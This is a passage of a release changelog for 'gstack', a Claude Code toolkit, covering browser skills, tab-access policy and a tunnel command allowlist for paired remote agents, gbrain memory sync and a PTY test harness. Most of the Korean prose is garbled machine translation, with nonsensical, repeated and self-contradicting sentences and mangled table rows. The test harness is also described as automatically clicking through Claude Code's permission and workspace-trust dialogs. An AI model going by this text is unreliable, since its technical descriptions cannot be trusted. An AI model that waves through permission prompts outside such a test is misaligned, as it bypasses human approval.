- **탭 액세스 정책.** `tabPolicy: 'shared'` (스킬 스케이드, default scoped 클라이언트): 허용, 범위 체크 + 비율 한계에 의하여만 문질러 어떤 탭을 읽거나 쓸 수 있습니다. `tabPolicy: 'own-only'` (터널에 에이전트): 엄격한, token는 그것을 소유하는 접근 탭만 할 수 있습니다. 두 정책은 자주적으로 `browser-manager.ts:checkTabAccess`에서 실행합니다. 이 기능 문은 이미 어떤 공유 토큰이 할 수 있는지 제약합니다; 탭은 단지 소유권을 위한 부분만 입니다.

#### 변경

- `browse/src/commands.ts` META 명령으로 `skill`를 등록합니다.
- `browse/src/server.ts`는 로컬 청취 포트 (`LOCAL_LISTEN_PORT`)를 메타 혼잡한 파견에 실을 꿰는 `$B skill run`는 스팸을 끄는 스크립트를 포인하는 포트를 알고 있습니다. `tabPolicy === 'own-only'`만에 대한 파견자 불에 전진된 탭 소유자 문; 공유 토큰은 그것을 건너 뛰습니다.
- `browse/src/browser-manager.ts:checkTabAccess` 키 `options.ownOnly`. 공유 토큰과 루트 패스는 무조건으로; 자체 전용 토큰은 모든 읽기 및 쓰기에 대한 소유권이 필요합니다.
- `browse/src/meta-commands.ts` `skill`를 `handleSkillCommand`로 파견합니다.
- `BROWSER.md` 완전한 참고에 rewritten: 1,299의 선, 26의 단면도는 생산력 반복, 브라우저 skills 런타임, 도메인 skills, 쌍 에이전트 이중 감적, sidebar 에이전트 + 맨끝 PTY, 안전 더미 L1-L6, 가득 차있는 근원 지도를 덮습니다.
- `docs/designs/BROWSER_SKILLS_V1.md`는 생산성 루프의 4개의 계약(제공 가드, 종합 입력 슬라이스, 원자 쓰기, 전체 테스트 적용)에 대한 디자인을 추가합니다. 1, 2a, 2b, 3, 4로 구성된 단계 테이블
- `TODOS.md` 목록 `/automate` 으로 P0 으로 기존 `PACING_UPDATES_V0` 항목.

#### 시험

- `browse/test/browser-skill-write.test.ts` - 34개의 assertions atomic-write 컨트랙트: 단계 검증, 파일 경로 탈출 거부, 원자 이름, clobber refusal, symlink refusal, idempotent discard, end-to-end happy + 실패 경로.
- `browse/test/tab-isolation.test.ts` - 명시된 공유 vs-own-only 적용을 가진 `checkTabAccess`에 9개의 assertions: 공유된 에이전트은/write 어떤 탭을 읽을 수 있습니다; 소유한 에이전트은 그들의 자신의 주장한 탭에 접근할 수 있습니다.
- `browse/test/server-auth.test.ts` - 미래의 재입고가 탭-납땜 게이트에 `WRITE_COMMANDS.has(command) ||`를 재입고하는 경우 실패한 소스 모양 회귀.
- `test/skill-validation.test.ts`는 번들된 브라우저 skills를 커버하기 위하여 늘입니다: 각에는 SKILL.md + script.ts + _lib/browse-client.ts (canonical에 바이트 IDentical) + script.test.ts가 있어야 합니다, frontmatter와 더불어 host/triggers/args 계약.
- `test/skill-e2e-skillify.test.ts` — 5개의 문 층 E2E 시나리오 (`claude -p`는, 국부적으로 파일에 대하여 deterministic:// 정착물): 묶는 기술에 경로 경로, 시제품 경로 드라이브 `$B`를 달고 JSON를 방출하고, 기술적인 행복은 완전한 기술 나무를, 입증한 refusal는 디스크에 아무것도, 승인 문 거절합니다 임시 직원 dir를 제거합니다.
- `test/helpers/touchfiles.ts`는 `scrape/**`, `skillify/**`, `browse/src/browser-skill-write.ts`, 런타임 모듈과 함께 deps를 가진 모든 5개의 새로운 E2E 입장을 기록합니다.

#### 기여자

- 브라우저 - 스킬 SKILL.md frontmatter는 `parseSkillFile()`와 `test/skill-validation.test.ts`에 의해 시행된 단단한 계약이 있습니다. 필수: `host` (string), `triggers` (string list), `args` (mapping list). 선택: `trusted` (bool, defaults false), `version`, `source` (`human`/`agent`), `description`.
- `browse/src/browse-client.ts`의 canonical SDK와 `browser-skills/hackernews-frontpage/_lib/browse-client.ts` MUST에서 sibling은 바이트 ID가 있. 기술 유효성 시험은 건축 그렇지 않으면 실패합니다. canonical SDK 변화가 있을 때, 각 번들한 기술 `_lib/` 사본을 새롭게 합니다. `/skillify`를 통해 에이전트 오해한 기술은 합성 시간에 신선하게 응어리를 얻고 SDK를, 그래서 그들은 (>) 저자에 대하여 저자에 의해 실행되었습니다. (no)는 저자에 대하여 가능한 한 빨리 이었습니다.
- atomic-write  helper는 "no 반휘발성 기술을 적용합니다." 항상 `stageSkill` → run test → `commitSkill` (success) OR `discardStaged` (failure)를 호출합니다. 최종 계층 경로에 직접 쓰기. 돕기 `validateSkillName`는 단지 naming 문이며, 단단히 유지하십시오 (lowercase letters/digits/dashes, ≤64 chars, no, no, no).
- `checkTabAccess` 정책: `ownOnly`는 접근을 제한하는 유일한 신호입니다. `isWrite`는 다른 곳에서 로그인하거나 branch를 원하는 통화자를 위한 서명에서 체재하고, 그러나 결정을 문이 아닙니다. 새로운 정책 축 (예를들면, per-skill 탭 quotas)를 `docs/designs/`에서 속한, 운동화 `isWrite` 하중 초과로 붙이는 것과 같이.
- `/automate`와 단계 4 후속 (Bun 런타임 배포, OS FS sandbox, 정착물 의식 탐지)는 `docs/designs/BROWSER_SKILLS_V1.md` 및 `TODOS.md`에서 추적됩니다. `/automate` 기술은 `/skillify`와 `browser-skill-write.ts` as-is를 재사용합니다; 새로운 코드는 변이 단계 확인 문입니다.

## [1.17.0.0] - 2026-04-26

## **gstack 메모리는 이제 실제로 gbrain에 살고 있습니다.**

지난 달 `/setup-gbrain`을 ran `/setup-gbrain`를 갖는 모든 분들은 `gbrain search`를 찾을 수 없습니다. CEO 계획, 학습, 또는 복고를 찾을 수 없습니다. Step 7은 `status: "pending"`를 썼고 그 일을 하였다. HTTP는 gbrain 측에 지적한 위주권이 결코 내장되지 않았습니다. 이 릴리스는 접근 방식을 스크랩으로 하고 gbrain v0.18.0 feration 표면 (`gbrain sync`)을 사용합니다.

업그레이드 후 `/setup-gbrain`는 뇌 repo의 `git worktree`를 추가하고, gbrain (Supabase 또는 PGLite)에 대한 federated 소스로 등록하고 초기 동기화를 실행합니다. gstack 기술 종료주기는 `gbrain sync`를 실행하여 인덱스의 새로운 artifacts 토지를 자동으로 실행합니다. 로컬 Mac 만. No 클라우드 에이전트가 필요합니다. `/gstack-upgrade`는 기존 사용자를 위해 실행합니다.

## 업그레이드 후 검증

```bash
gbrain sources list --json | jq '.sources[] | {id, page_count, federated}'
# Expect: two entries, your default brain plus a "gstack-brain-{user}"
# entry, both federated=true.

gbrain search "ethos" --source gstack-brain-{user} | head -5
# Expect: hits from your gstack repo content (readme, ethos, designs, etc).
```

## # 배송

`bin/gstack-gbrain-source-wireup`는 새로운 돕는 사람입니다. `~/.gstack/.git`의 origin URL (`~/.gstack-brain-remote.txt`와 `--source-id` 깃발에 다 떨어지는 상태에서), detached `git worktree`를 창조합니다 `~/.gstack-brain-worktree/`에서, gbrain에 federated 근원으로 그것을, 실행 처음 backfill, 그리고 지원 `--strict` (Step 7/>, `--uninstall` (Step), `--uninstall` (step), `--uninstall` (step), `--uninstall` (step), `--uninstall` (step)를 포함하여 모든 검사합니다. 돕는 `jq` (`gstack-gbrain-detect`를 통해)에 달려 있습니다.

돕는 데이터베이스를 잠금 URL 시작 (선언: `--database-url` 플래그 > `GBRAIN_DATABASE_URL`/`DATABASE_URL` env > 한 번에 읽기 `~/.gbrain/config.json`) 그리고 모든 아이 `GBRAIN_DATABASE_URL`로 내보내기 `gbrain` invocation. 이것은 `~/.gbrain/config.json` mid-sync (예: 동시 `gbrain init --non-interactive` 다른 작업 공간에서 실행) 다른 뇌에 연결하지 않을 수 없습니다. `loadConfig()` 파일에 다른 뇌에 복사하는 경우, gb> 파일에 다른 뇌에 연결됩니다. `/setup-gbrain`의 단계 7개는 `config.json`에서 URL를 한 번 읽고 `--database-url`를 통해 명시적으로 통과합니다, 그래서 wireup는 초 분 동기화 창 도중 설정 손가락에 대하여 튼튼합니다.

`/setup-gbrain` 단계 7 이제 `gstack-brain-init` 후 `--strict`를 가진 돕기를 호출합니다. `--strict` 없이 돕는 `gstack-upgrade/migrations/v1.12.3.0.sh` 이렇게 누락된 /old gbrain는 배치 향상 도중 benign 건너뛰기입니다. `bin/gstack-brain-restore`는 처음 clone 후에 돕기를 지시합니다 그래서 제 2 Mac는 wireup 자동적으로 얻습니다. `bin/gstack-brain-uninstall`는 `--uninstall`를 반전합니다`consumers.json`는 leg10/>를 제거합니다.

`bin/gstack-brain-init`는 60개의 행의 죽은 소비자 봉사 코드 (HTTP POST 구획, `consumers.json` 작가, chore commit)의 떨어뜨립니다. `bin/gstack-brain-restore`는 18 선 `consumers.json` 토큰 보유 구획 (실제적인 토큰이 없는 유일한 소비자)를 삭제합니다. `bin/gstack-brain-consumer`는 그 우량에 있는 그것의 우두머리 docstring에서 deprecated; v1.18.0.0의 1개의 주기 후에 제거.

`test/gstack-gbrain-source-wireup.test.ts` is new: 13 unit tests with a fake `gbrain` binary on `$PATH` covering fresh-state registration, idempotent re-runs, drift recovery (gbrain has no `sources update`, only `remove + add`), `--strict` failure modes, source-id fallback chain (`.git` → remote-file → flag), `--probe` non-mutation, sync errors, and `--uninstall`.

### 중요 한 숫자

이 업그레이드 후 모든 기계에 재현 할 수 있습니다. 자신의 델타를 볼 위의 확인 명령을 실행하십시오.

| Metric | 전 (v1.16.0.0) | (v1.17.0.0) 이후 |
|---|---|---|
| `gbrain sources list` 크기 | 1 (default `/data/brain`) | 2 (default + `gstack-brain-{user}`) |
| `consumers.json` 상태 | `"pending"`, ingest_url `""` | 파일 삭제 된 새 설치 |
| 위로 철사에 수동 단계 | 4 (클로로로 + 소스 + 동기화 + cron 추가) | 0의 단계 7에서 자동 |
| Helper 시험 적용 | 0 단위 시험 | 13 단위 테스트 (`bun test test/gstack-gbrain-source-wireup.test.ts`) |
| `bin/gstack-brain-init` 크기 | 363 라인 | 300 라인 (60 줄의 죽은 코드 제거) |

로컬 맥은 `~/.gstack/`의 커밋으로 자동적으로 artifacts와 worktree의 생산자입니다. Cross-machine sync는 GitHub를 통해 기존 `gstack-brain-sync --once` push 걸이를 통해 No 새로운 cron 인프라를 통해 실행됩니다. gbrain v0.21 코드 도표 특징 배가 있을 때, 돕는 사람 `--enable-cron` 깃발은 청결한 연장입니다.

### 이 빌더를 위한 뜻

gstack 메모리는 검색 가능. CEO 플랜 검토 또는 사무실 시간 세션을 실행하고, sync는 기술 종료에서 자동으로 실행되며 `gbrain search`는 어떤 gbrain 클라이언트 (이 Claude Code 세션, 미래 Macs, 옵션 클라우드 에이전트 OpenClaw)에서 플랜 콘텐츠를 찾습니다. 기계 전체에 대한 진실의 한 소스. 위주자는 죽습니다.

### 기여자

- `bin/gstack-brain-consumer`는 이 방출에서 deprecated; v1.18.0.0에 있는 제거.
- `gbrain_url`와 `gbrain_token` 구성 키는 이제 아무 ops가 없습니다. 그들은 v1.18.0.0에서 제거된 백-컴퍼를 위한 1개의 주기를 위해 읽기 쉬운 남아 있습니다.
- 이 branch (`gstack-config gbrain keys > GSTACK_HOME overrides real config dir`, `no compiled binaries in git > git tracks no files larger than 2MB`, `Opus 4.7 overlay — pacing directive`)에 3개의 전 효험 시험 실패는 기초 branch에 실패하기 위하여 확인되었습니다. 이 PR를 위한 범위의 밖으로; 후속을 위해 끌기.

## [1.16.0.0] - 2026-04-28

## **페어 에이전트 터널 allowlist 이제 docs가 이미 약속한 것을 일치합니다. Catch-22 해결, 게이트는 단 하나 테스트 가능.**

볼 수 있는 버그: ngrok 터널에 대한 쌍의 원격 에이전트는 `newtab`, `tabs`, `goto-on-existing-tab`, 다른 명령의 체인은 작업 주장. 숨겨진 버그: v1.6.0.0 `TUNNEL_COMMANDS` allowlist는 17 항목에서 설정되었지만 `docs/REMOTE_BROWSER_ACCESS.md`, `browse/src/cli.ts:546-586`, 연산자-facing 명령어는 모든 문서 26. allowlist.allowlist는 이 틈새 릴리스에서 발송됩니다. 이 틈새가 틈새가 틈새에 닿지 않는 경우: 이 틈새 디자인에서 이 틈새가 떨어졌습니다. 9 명령은 추가 (`newtab`, `tabs`, `back`, `forward`, `reload`, `snapshot`, `fill`, `url`, `closetab`), `server.ts:613-624`에서 기존의 per-tab 소유권 체크에 의해 각 경계를 붙였습니다. Scoped 토큰 default에서 `tabPolicy: 'own-only'`, 이렇게 쌍이 된 에이전트은 여전히 탐색 할 수 없습니다, fill, 또는 그 이전에는 더 가까운 탭이 아닙니다.

### 중요 한 숫자

분기 총은 `git diff --shortstat origin/main..HEAD`에서 옵니다. 계산은 `bun test browse/test/dual-listener.test.ts browse/test/tunnel-gate-unit.test.ts browse/test/pair-agent-tunnel-eval.test.ts browse/test/pair-agent-e2e.test.ts`에서 병합된 나무에 대하여 옵니다.

| Metric | Δ |
|---|---|
| 터널 allowlist 크기 | **17 → 26 명령** (+53%) |
| Catch-22 해상도 | `newtab` → `goto` → `back` 사슬은 첫번째로 작동했습니다 |
| 문 시험성 | 인라인 regex 체크 → **pure exported `canDispatchOverTunnel()`** 기능 |
| 새로운 단종 | **53 예상** (로, 막힌, null/undefined/non-string, alias canonicalization) |
| 새로운 행동 적용 | **4개의 시험** `pair-agent-tunnel-eval.test.ts` BOTH를 실행하는 **4개의 시험**는 현지으로 듣습니다 (no ngrok) |
| 소스 레벨 가드 | 26-command 문학 + 소유권 면제 regex에 대한 정확한 설정 평등 |
| 무료 시험 | **69 패스 / 0 실패** 4개의 터치된 시험 파일에 |
| Codex 리뷰 패스 | 플랜 모드 중 **2개의 외부 청구서 둥근**, 7개의 발견 6개 |

### 이 의미는 쌍이 된 에이전트를 실행하는 사용자

Three things change immediately. **First**, paired agents can actually open and drive their own tab without hitting the catch-22 the prior allowlist created. `newtab` succeeds (the ownership-exemption at `server.ts:613` was always there, but the allowlist gated the entry); `goto`, `back`, `forward`, `reload`, `fill`, `closetab` all work on the just-created tab; `snapshot`, `url`, `tabs` give the agent the read-side surface needed to be useful. **2월 2일**, 터널 표면 게이트는 현재 단 하나 테스트 가능 - `canDispatchOverTunnel(command)`는 `browse/src/server.ts`에서 수출되고, 53의 기대에 의해 덮습니다. 게이트 논리에서 allowlist 리터럴을 분리하는 미래 재원은 밀리 초에 무료 테스트를 실패합니다. **3월 3일**, `pair-agent-tunnel-eval.test.ts`는 BOTH와 함께 문 끝을 운동하고 127.0.0.1 (no)에 터널 경계를 듣습니다. 이렇게 "no는 "이번을 듣는 문"을 뛰기 위하여, 이렇게 요구했습니다; "ngrok는 이렇게 요구했습니다; 이 하나는 로컬 리리스를 명중, 게이트 건너"-는 모든 PR에 asserted. 새로운 `BROWSE_TUNNEL_LOCAL_ONLY=1` env var는 호출없이 두 번째 리리스를 로컬로 바인딩 ngrok, 외부 테스트 모드에 문. 생산 터널은 여전히 `BROWSE_TUNNEL=1` + 유효 `NGROK_AUTHTOKEN`을 요구합니다.

### 항목화 된 변경

#### 추가

- `browse/src/server.ts:111-120` `TUNNEL_COMMANDS` 세트에 있는 9개의 새로운 명령: `newtab`, `tabs`, `back`, `forward`, `reload`, `snapshot`, `fill`, `url`, `closetab`. 세트는 지금 이렇게 시험이 리터럴을 직접 참조할 수 있습니다 수출됩니다.
- `canDispatchOverTunnel(command: string | undefined | null): boolean` in `browse/src/server.ts` - 순수한 수출한 기능. 손잡이 비 끈 입력, alias 해결책, 반환 `TUNNEL_COMMANDS.has(canonical)`를 위한 `canonicalizeCommand`.
- `BROWSE_TUNNEL_LOCAL_ONLY=1` env var in `browse/src/server.ts:2080-2104`. branch를 `BROWSE_TUNNEL=1`로 옮기는 것은 ngrok 없이 `makeFetchHandler('tunnel')`를 통해 두번째 `Bun.serve` 리스너를 묶는 `makeFetchHandler('tunnel')`에 시험 전용 주사 `tunnelLocalPort`. 읽을 것이다 eval를 위한 국가 파일에 `tunnelLocalPort`.
- `browse/test/tunnel-gate-unit.test.ts`: 53는 모든 26의 허용한 명령, 20의 막힌 명령 (쌍, 수선, 과자, 설치, 발사, 재시작, 정지, 터널 종료, 토큰 민트, 등), null/undefined/empty/non-string 방어적인 취급 및 별칭 canonicalization (예를들면 `set-content`는 `load-html`로 해결하고 `load-html`가 터널 허용되지 않는 때문에 정확하게 거절됩니다).
- `browse/test/pair-agent-tunnel-eval.test.ts`: `BROWSE_HEADLESS_SKIP=1 BROWSE_TUNNEL_LOCAL_ONLY=1`의 daemon를 쫓아주는 4개의 행동 시험은, 127.0.0.1에 청취자 둘 다, 기존 token → `/connect` 행사를 통해 `newtab`를 `pair`를 `disallowed_command:pair`를 통해 `pair`를, 그리고 assert: (1) `newtab`는 터널에 문을 통과합니다; (2) `disallowed_command:pair`를 가진 터널 403s에 AND는 신선한 방아쇠 `pair`를 들을 것입니다; 지역 방아쇠를 들을 것이다 `pair`; (4) 캐치 22에 대한 회귀 테스트 - `newtab`는 `goto`를 결과 탭에서 `Tab not owned by your agent`로 403하지 않습니다.

#### 변경

- `browse/test/dual-listener.test.ts`: 반드시 +를 포함해야 한다. assertions는 26-command 문학에 대한 한 가지 정확한 품질 테스트로 대체. 이전 테스트의 교차 전용 스타일은 해당 테스트 업데이트없이 소스에 새로운 명령을 잡아 - 양방향 체크는 두 가지 방법을 잡는다. `server.ts:613`의 소유권 면제 항목이 있음을 regex assertion를 추가 (다른 캐치에서 다시 투표).
- `browse/test/dual-listener.test.ts`: `/command` 핸들러 테스트는 인라인 `TUNNEL_COMMANDS.has(cmd)` 체크에 업데이트되었습니다 `canDispatchOverTunnel(body?.command)` — 문이 순수한 기능에 위임되고 복제되지 않습니다 증명합니다.
- `docs/REMOTE_BROWSER_ACCESS.md:35,168`: "26-command allowlist"에 "17-command allowlist를 범인했습니다. allowlist의 IS인 `eval`를 제거한 denied-commands list (removed `eval`를 수정했습니다. 이전 문서는 잘못되었습니다.
- `CLAUDE.md`: 수송 층 안전 단면도의 "17-command 브라우저 - "26-command"에 참고를 범람했습니다.

#### 기여자

- The plan was reviewed under `/plan-eng-review` plus 2 sequential codex outside-voice passes during plan mode. Round-1 codex caught a doc-target mistake (we were going to update `SIDEBAR_MESSAGE_FLOW.md` instead of `REMOTE_BROWSER_ACCESS.md`) and a wrong-layer test design. Round-2 codex caught that the round-1 correction was still wrong (the chosen test harness only binds the local listener) AND that the docs promised 6 more commands than the allowlist had. 모든 6의 7 하위 stantive 발견은 구현에 착륙; 7 (예를 들어 `/pair-agent` `/health` probe `cli.ts:656-668`)에서 잡힌 것은 범위에서 로그입니다.
- `tabs`는 터널에서 ALL 탭을 브라우저에서 반환합니다. `tabs`는 에이전트가 소유하지 않습니다. 사용자가 에이전트를 페어링 할 때 신뢰 관계를 승인 한 에이전트는 이미 CONTENT를 읽을 수 없습니다. (쓰기 명령은 차단된, 활성 탭은 `tab <id>` 명령이 NOT가 allowlist인 allowlist), `goto`를 통해 입력되지 않습니다. `goto`는 이미 `goto`를 통해 `goto`를 출력하지 않습니다. Codex 이 조인트 문 자체를 만지지 않도록 (문은 `getActiveTabId()` BEFORE "으로 돌아갑니다 `server.ts:603-614`)에 있는 BEFORE 파견, 잡음 22의 고침을 위한 범위에서 물자로 밖으로. 받아들여지는 계획 실패 형태 테이블에서 기록했습니다.

## [1.15.0.0] - 2026-04-26

## **Real-PTY 테스트 하네스 배. 11 계획 모드 E2E 테스트, 23 단위 테스트, 그리고 50K 초급 토큰을 invocation 당.**

한 번에 엔지니어링의 두 가지 큰 조각. 헤드 라인은 실제 PTY 테스트 하네스 - `Bun.spawn({terminal:})`의 상단에 TypeScript의 654 라인이며 실제 `claude` 바이너리 및 파스 렌더링 터미널 프레임을 구동한다. 6 새로운 E2E 테스트 하네스 커버 행동은 구조적으로 접근할 수 없는 전에: gstack `AskUserQuestion`, 계획 설계 UI-scope detection (긍정적 인 적용), 도구 판자 회귀 대 사전 실행, `/ship` 실제 git 정착물에 대한 종말 대역 idempotency, `/plan-ceo` 대답 여정, 그리고 `/autoplan` 단계 sequencing. branch 그물은 `main`에 대하여 `main`에 대하여 더 작은 11.6K 선을 새로운 TypeScript 시험 코드의 ~1,450의 선을 추가하고 - preamble 결심자는 더 적은 prose에 있는 각 semantic 규칙을 지키는 rewritten, 그리고 AskUserQuestion 무인은 각 PR에 0에서 문 층에서 확장했습니다.

### 중요 한 숫자

분기 총은 `git diff --shortstat origin/main..HEAD`에서 옵니다. 토큰 레벨 감소는 rewritten 결산자 (`bun run gen:skill-docs --host all`)에 대하여 각 `SKILL.md`를 재생하는에서 옵니다. E2E 수는 청결한 작동 나무에 `EVALS=1 EVALS_TIER=gate bun test test/skill-e2e-*.test.ts`에서 옵니다.

| Metric | Δ |
|---|---|
| 순 branch 크기 대 `main` | **−11,609의 선** (89 파일, +7,240 / −18,849) |
| 새로운 테스트 파일 추가 | **8 파일** (1개의 마구 단위 시험 + 7 E2E 시험) |
| 배송된 새로운 테스트 코드 | **~1,453 라인** TypeScript |
| Real-PTY 하네스 모듈 | **654의 선** `test/helpers/claude-pty-runner.ts` |
| 퍼인드 token 절감 | **−196K 토큰 (-25%)** 감기에 읽힌 |
| `plan-ceo-review` 전방 | **−43%** (54 KB → 31 KB) |
| 계획 형태 E2E 시험 조사 | **5 → 11** |
| 새로운 게이트 계층 지불 E2E 테스트 | **+3** (정보 준수, 디자인-UI, 예산 회귀) |
| 새로운 정기적인 계층은 E2E 시험을 지불했습니다 | **+3** (모드로 팅, 배기구, 오토플랜체인) |
| Helper 단위 시험 적용 | **+23 테스트** 파서 + 예산 원시 |
| 무료 시험 | **49 패스, 0 실패** |

| 기술 클래스 | Per-invocation 표면 | Δ |
|---|---|---|
| Tier-≥3 플랜 리뷰 (전체 preamble) | ~50 KB → ~30 KB | −40% |
| Tier-1 빠른 기술 | ~12 KB → ~9 KB | −25% |

모든 gstack invocation는 이제 추운 읽음에 모델에 ~50K의 수퍼 토큰을 보냅니다. 실제 작업에 대해 200K 컨텍스트 창의 약 1/4입니다. Tier-≥3 플랜 리뷰는 전체 기능 표면 (Brain Sync, Context Recovery, Routing Injection)을 유지하고 거의 절반 바이트를 잃습니다.

### 이 빌더를 위한 뜻

PR를 차단할 수 없는 재귀의 세 가지 새로운 클래스. **체재 drift**: 누락된 `Recommendation:` 선 또는 absent Pros/Cons 총알에 `AskUserQuestion`는 실제 렌더링된 터미널에 대해 잡혔지만, 모델의 주장이 보여지는 것은 아닙니다. **조건부 기술 경로**: `/plan-design-review`는 no UI 범위가 있을 때 초기에 나왔습니다. 그러나 이 경로는 시험되지 않습니다. **조건부 기술 경로**: `/plan-design-review`는 no 범위가 있을 때 초기에 있었습니다. a regression that flipped the detector to "early-exit always" could have shipped silently. **도구 판결 회귀**: a preamble change that makes any skill burn 2× its prior tool calls fails a free, branch-scoped assertion that runs on every `bun test`.

The harness itself is a reusable primitive. `runPlanSkillObservation()` watches plan-mode terminal output and classifies outcomes as `asked` / `plan_ready` / `silent_write` / `exited` / `timeout`. Three periodic-tier tests built on top of it cover the heavier cases — multi-phase chain ordering, ship idempotency state-machine end-to-end, and answer routing through 8-12 sequential prompts — that don't fit a per-PR budget but run weekly. `bun run gen:skill-docs --host all`를 실행하고, 각 기술 invocation는 우선 출시보다 더 작고 의미있게 더 잘 테스트됩니다.

### 항목화 된 변경

#### 추가

- `test/helpers/claude-pty-runner.ts`: `Bun.spawn({terminal:})` (Bun 1.3.10+는 PTY — no `node-pty`, no 기본 단위를 사용하는 진짜PTY 시험 마구를 건축했습니다). 계획 형태 기술 시험을 위한 고도 계약으로 `launchClaudePty()`를 위한 `launchClaudePty()`를 노출하십시오.
- `parseNumberedOptions(visible)` 및 `isPermissionDialogVisible(visible)` 헬퍼는 `claude-pty-runner.ts`에서 돕습니다. 테스트는 이제 하드 코딩 위치 없이 라벨에 의해 옵션을 인덱스를 파악하고, 자동 과립 Claude Code의 파일 편집/작업 공간 신뢰/배치 방출 대화 상자를 미리 조립하는 부작용 도중 불로 만듭니다.
- `findBudgetRegressions()` 및 `assertNoBudgetRegression()` `test/helpers/eval-store.ts`. 도구에서 >2×를 성장하는 순수한 기능 반환 시험은, 5개의 사전 도구/3의 바닥과 더불어, 소음을 피하기 위하여 돕기 위하여 전 3개의 턴과 더불어, 턴합니다. Env override `GSTACK_BUDGET_RATIO`.
- 6 새로운 실제 PTY E2E는 마구에 시험합니다:
    - `skill-e2e-ask-user-question-format-compliance.test.ts` (게이트, ~$0.50/run): gstack `AskUserQuestion` 렌더링은 7개의 매니드 포맷 엘리먼트(ELI10, 추천, Pros/Cons 와 ✅/❌, Net, `(recommended)` 라벨)를 포함합니다.
    - `skill-e2e-plan-design-with-ui.test.ts` (게이트, ~$0.80/run): `/plan-design-review` UI-scope detection를 위한 긍정적인 적용. 기존 no-UI 초기검사 시험에 반대한다 — 없이, 검출기를 "early-exit 항상"로 플리케이션하는 회귀는 검출되지 않을 것이다.
    - `skill-budget-regression.test.ts` (게이트, 무료): no 기술이 >2× 도구로 나타낸 branch의 경우, 사전 녹화된 실행을 대리합니다.
    - `skill-e2e-plan-ceo-mode-routing.test.ts` (기간, ~$3/run): AskUserQuestion 대답 여정을 정의합니다 - HOLD SCOPE는 rigor 언어, SCOPE EXPANSION 확장 언어에 노선을 선택합니다.
    - `skill-e2e-ship-idempotency.test.ts` (기간, ~$3/run): `/ship`는 `STATE: ALREADY_BUMPED`에서 구워지는 `STATE: ALREADY_BUMPED`를 가진 진짜 git 정착물에 대하여 말립니다; asserts no 두 배 펌프, no 두 배 조미료, no 정착물 돌연변이.
    - `skill-e2e-autoplan-chain.test.ts` (기간, ~$8/run): `/autoplan` 각 `**Phase N complete.**` 감적표로 티링 타임스탬프에 의해 순서로 asserts `/autoplan` 단계.
- `test/helpers-unit.test.ts`: 23 단위 시험 덮음 `parseNumberedOptions` 가장자리 케이스 (비과, 부분 페인트, >9 선택권, stale-vs-fresh 닻) 및 `findBudgetRegressions` (비활성 지면, env override, 누락한 도구 자료).
- `test/fixtures/plans/ui-heavy-feature.md`: 새로운 디자인과 UI 시험을 위한 UI 범위 키워드를 가진 계획된 계획.
- 작업 공간 위탁 대화 상자의 자동 취급 그래서 시험은 수동 개입 없이 임시 직원 감독에서 실행합니다.
- 결과: `asked` | `plan_ready` | `silent_write` | `exited` | `timeout`. `asked` 또는 `plan_ready`에 대한 테스트 패스, 나머지 실패.

#### 변경

- 압축되는 18 preamble 해결자: `generate-ask-user-format.ts`, `generate-brain-sync-block.ts`, `generate-completeness-section.ts`, `generate-completion-status.ts`, `generate-confusion-protocol.ts`, `generate-context-health.ts`, `generate-context-recovery.ts`, `generate-continuous-checkpoint.ts`, `generate-lake-intro.ts`, `generate-preamble-bash.ts`, `generate-proactive-prompt.ts`, `generate-routing-injection.ts`, `generate-telemetry-prompt.ts`, `generate-upgrade-check.ts`, `generate-vendoring-deprecation.ts`, `generate-voice-directive.ts`, `generate-writing-style-migration.ts`, `generate-writing-style.ts`.
- 생성된 모든 47개의 `SKILL.md` 파일; 재생된 3개의 배 황금 정착물.
- Plan-* 기술은 전체 preamble 표면 (Brain Sync, Context Recovery, Routing Injection)을 유지 - 이러한 절단 초기 슬림 시도는로드 베어링으로 진단 후 다시 거꾸었습니다.
- 5개의 기존 플랜 모드 테스트(`plan-ceo`, `plan-eng`, `plan-design`, `plan-devex`, `plan-mode-no-op`)는 300s 관측 예산을 가진 새로운 마구에 rewritten. 실제 `claude` 이진에 대하여 `EVALS=1 EVALS_TIER=gate`의 모든 5개의 검증 통행.
- `isNumberedOptionListVisible` regex는 `stripAnsi`가 제거한 `\b2\.`가 출력을 읽는 `text2.`가 있는 단어에 읽는 단어에 읽힌 단어로 전환된 `text2.`를 제거하는 `isNumberedOptionListVisible`의 백스페이스 붕괴를 허용했습니다.

#### 고정

- `scripts/skill-check.ts`: 새로운 `isRepoRootSymlink()` 돕는 이렇게 repo 루트를 `host/skills/gstack` (예를들면, codex's `.agents/skills/gstack`)에 거치하는 것을 설치합니다 두 배 표 대신에 건너 뛰는.
- `test/skill-validation.test.ts`: 알려진 대형 고정장치 면제는 `browse/test/fixtures/security-bench-haiku-responses.json` (27 MB BrowseSafe-Bench 재생 정착물, 의도)를 크기 경고에서 유지합니다.

#### 제거

- `test/helpers/plan-mode-helpers.ts`: `claude-pty-runner.ts`에 의해 초소화. 0개의 외침은 다시 쓰기 후에 남아 있었습니다.

#### 기여자

- `test/helpers/touchfiles.ts`: 5개의 계획 형태 시험 선택 + e2e-harness-audit 선택은 삭제된 돕기 대신에 `claude-pty-runner.ts`에 지금 점합니다. 6개의 새로운 입장 (`ask-user-question-format-pty`, `plan-ceo-mode-routing`, `plan-design-with-ui-scope`, `budget-regression-pty`, `ship-idempotency-pty`, `autoplan-chain-pty`) 및 층 분류로: 3개의 문, 3개의 주기적인.
- `test/e2e-harness-audit.test.ts`: `runPlanSkillObservation`를 유산 `canUseTool`/ `runPlanModeSkillTest` 본과 함께 유효한 적용 경로로 인식합니다.
- 새로운 단위 테스트: `test/gen-skill-docs.test.ts` asserts plan-review preambles stay under 33 KB and the slim Voice section keep its load-bearing semantic contract (lead-with-the-point, name-the-file, user-outcome framing, no-corporate, no-AI-vocab, user-sovereignty).
- `test/touchfiles.test.ts`: 기술 별 변화 선택 조사는 15 → 18를 업데이트했습니다 `plan-ceo-review/**`에 달려 있는 6개의 새로운 접촉 파일 입장 일치하기 위하여.

## [1.14.0.0] - 2026-04-25

## **gstack 브라우저 사이드바는 이제 실제 탭 인식을 가진 Claude Code REPL를 상호 작용하는 Claude Code입니다.**

사이드 패널을 열고 Claude Code는 실제 터미널에 있는 오른쪽입니다. 유형, 에이전트 작업을 시청, 브라우저 탭과 Claude 변경을 참조하십시오. 오래된 원샷 채팅 큐가 사라집니다. 두 방향 대화, 슬래시 명령, `/resume`, ANSI 색상, 모두. 플러스 `$B tab-each` 명령을 사용하여 팬들은 모든 열린 탭에서 단일 검색 명령을 꺼내 per-tab JSON 결과를 반환합니다.

### 중요 한 숫자

| Metric | 의 전 | 후지후 | Δ |
